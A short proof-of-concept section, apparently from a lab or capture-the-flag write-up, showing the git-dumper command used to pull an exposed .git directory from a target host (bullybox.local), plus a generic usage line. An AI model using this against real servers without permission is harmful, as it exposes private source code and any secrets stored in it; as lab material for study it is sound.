
## PoC

We can utilize the tool "git-dumper" in order to download an remote git repository onto our local machine.

```
git-dumper http://bullybox.local/.git /git
```

```
git-dumper <URL> <local_directory>
```
